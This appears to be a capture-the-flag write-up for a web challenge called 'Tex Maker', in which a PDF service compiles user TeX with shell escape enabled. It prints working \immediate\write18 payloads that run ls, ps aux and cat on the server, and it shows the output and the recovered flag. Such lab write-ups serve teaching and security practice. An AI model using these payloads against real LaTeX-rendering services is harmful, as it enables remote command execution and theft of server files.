#  Tex Maker
 > Description: Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any flaws.

> Service: https://texmaker.ctf.internetwache.org

## Solution
To solve this challenge, we use the fact that the code aparently has been reviewed, by someone not familar with TeX.

In TeX you can insert the result of commands directly in your document, so all we have to do is a little bit of
exploring, in the local environment on which the challenge runs.

# Step 1: Is the Tex vulnerable
Before we go on we just insert a tex command to execute a local command and get the result out.
We craft our document like this:

>  \immediate\write18{ls /}

This seems to work as we get a listing in our output, when we generate the document.


#Setp 2: Where are the files!
Now we need to know where the webservice keeps its files, we could do a directory traversal manually, but
we have no time for that, we issue a "ps aux" command instead.

>  \immediate\write18{ps aux/}


> web90 16701  0.0  0.0  4336  756 ?  S    10:51   0:00 sh -c cd /var/www/texmaker.ctf.internetwache.org/compile/ && /usr/bin/pdflatex --shell-escape 85c81cdeb3192d6ffe41f54f8119f0e4.tex

From the above, we can see that the root of this challenge is in 
 /var/www/texmaker.ctf.internetwache.org/


We list this directory 
>   \immediate\write18{ls /var/www/texmaker.ctf.internetwache.org/}


And find some interesting file

flag.php


#Setp 3: Profit!

We display the conternt of the flag.php file 

>    \immediate\write18{cat /var/www/texmaker.ctf.internetwache.org/flag.php}

And we get the following:

> $FLAG = "IW{L4T3x_IS_Tur1ng_c0mpl3te}";

Mission Complete!
